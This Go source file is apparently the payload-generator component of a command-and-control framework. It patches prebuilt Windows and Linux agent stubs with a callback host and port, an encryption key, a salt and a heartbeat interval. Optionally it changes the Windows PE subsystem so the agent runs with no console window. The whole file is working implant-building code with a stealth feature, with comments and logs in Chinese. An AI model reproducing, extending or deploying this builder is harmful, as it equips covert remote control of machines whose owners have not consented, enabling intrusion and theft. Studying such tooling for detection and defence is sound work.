package payload

import (
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"strings"
	"time"

	"c2/internal/c2embed"
)

type Generator struct {
	templatesDir string
	outputDir    string
}

func NewGenerator() *Generator {
	return &Generator{
		templatesDir: "webdist/templates/payloads",
		outputDir:    RelPathGenerated,
	}
}

type Config struct {
	ListenerID        uint
	Mode              string
	ServerAddr        string
	ExternalAddr      string
	// ListenAddr 监听器本机绑定地址（如 0.0.0.0:4444）；在 external 仅填 IP/主机名时用于补全端口。
	ListenAddr        string
	VKey              string
	Salt              string
	Arch              string
	OS                string
	Format            string
	Obfuscate         bool
	HeartbeatInterval int
	WebHost           string
	WebPort           int
	// HideConsole 为 true 时，对 Windows PE 将子系统从控制台(CUI)改为 GUI，运行时不弹出控制台窗口。
	HideConsole bool
}

// Generate 仅从 stubs 模板读取并修补 C2EMBED1，写入 data/generated；不调用本机编译器。
func (g *Generator) Generate(cfg *Config) (string, error) {
	if err := os.MkdirAll(g.outputDir, 0755); err != nil {
		return "", fmt.Errorf("创建输出目录: %w", err)
	}

	switch cfg.OS {
	case "windows_x64", "windows_x86", "linux_amd64":
	default:
		return "", fmt.Errorf("unsupported OS: %s", cfg.OS)
	}

	if cfg.Format != "bin" {
		return "", fmt.Errorf("仅支持可执行文件格式 bin（从 %s 模板修补），当前: %s", RelPathStubs, cfg.Format)
	}

	host, port, err := DialHostPortForAgent(cfg.ExternalAddr, cfg.ListenAddr)
	if err != nil {
		return "", err
	}
	if port < 1 || port > 65535 {
		return "", fmt.Errorf("TCP 端口无效: %d", port)
	}

	if cfg.HeartbeatInterval == 0 {
		cfg.HeartbeatInterval = 30
	}

	timestampNano := time.Now().UnixNano()
	var ext string
	if cfg.OS == "linux_amd64" {
		ext = ".elf"
	} else {
		ext = ".exe"
	}
	filename := fmt.Sprintf("payload_%d_%s_%d%s", cfg.ListenerID, cfg.OS, timestampNano, ext)
	outputPath := filepath.Join(g.outputDir, filename)

	raw, err := loadStubTemplate(cfg.OS)
	if err != nil {
		return "", err
	}

	off := c2embed.FindPatchOffset(raw)
	wh, wp := cfg.WebHost, cfg.WebPort
	if strings.TrimSpace(wh) == "" {
		wh = "127.0.0.1"
	}
	if wp == 0 {
		wp = 8080
	}
	log.Printf("[payload] 修补前: C2EMBED1 在模板中的文件偏移=%d | 将写入 TCP=%s:%d Web=%s:%d 心跳=%ds | listener=%d os=%s",
		off, host, port, wh, wp, cfg.HeartbeatInterval, cfg.ListenerID, cfg.OS)
	if off < 0 {
		log.Printf("[payload] WARN: 模板中未找到可修补的 C2EMBED1 块，后续 PatchC2Embed 将失败")
	}

	out, err := PatchC2Embed(raw, cfg, host, port)
	if err != nil {
		return "", fmt.Errorf("修补 C2EMBED1 失败（模板是否含魔数？）: %w", err)
	}
	if cfg.HideConsole && (cfg.OS == "windows_x64" || cfg.OS == "windows_x86") {
		if err := patchPESubsystemWindowsGUI(out); err != nil {
			return "", fmt.Errorf("隐藏控制台(修改 PE 子系统): %w", err)
		}
	}
	if pv, _, e2 := c2embed.ParseFirst(out); e2 != nil {
		log.Printf("[payload] WARN: 修补后回读解析失败: %v", e2)
	} else {
		log.Printf("[payload] 修补后校验(从二进制回读): TCP=%q port=%d | Web=%q port=%d | vkey_len=%d salt_len=%d hb=%d",
			pv.Host, pv.Port, pv.WebHost, pv.WebPort, len(pv.VKey), len(pv.Salt), pv.Heartbeat)
	}

	if err := ioutil.WriteFile(outputPath, out, 0755); err != nil {
		return "", fmt.Errorf("写入载荷: %w", err)
	}
	log.Printf("[payload] 已写入 %s", outputPath)
	return filepath.Base(outputPath), nil
}

func (g *Generator) GetSupportedFormats() []string {
	return []string{"bin"}
}

func (g *Generator) GetSupportedOS() []string {
	return []string{"windows_x64", "windows_x86", "linux_amd64"}
}

func (g *Generator) GetSupportedArch() []string {
	return []string{"x64", "x86"}
}
